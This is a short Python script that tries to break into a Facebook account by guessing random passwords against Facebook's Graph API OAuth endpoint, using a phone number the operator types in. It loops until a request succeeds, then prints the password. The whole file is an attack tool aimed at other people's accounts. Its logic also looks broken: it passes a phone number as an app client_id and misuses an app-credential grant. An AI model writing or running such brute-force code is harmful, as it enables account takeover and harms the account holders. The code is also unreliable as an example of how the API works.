import requests 
from rgp import pswd
from password_provider import random_password_ex_symbols,random_password_wit_symbols





def start():
  number=input('please input user phone number => ')

  while True:
    passwrord_with_symbol=random_password_wit_symbols()
    passwrord_without_symbol=random_password_ex_symbols()

    pwd=pswd(passwrord_with_symbol,passwrord_without_symbol)
    url=f"https://graph.facebook.com/oauth/access_token?client_id={number}&redirect_uri=https://www.facebook.com/connect/login_success.html&client_secret={pwd}&grant_type=client_credential"
    res=requests.get(url)

    if res.status_code == 200:
      print(pwd)
      break
    else:
      print(pwd)
      print('failed')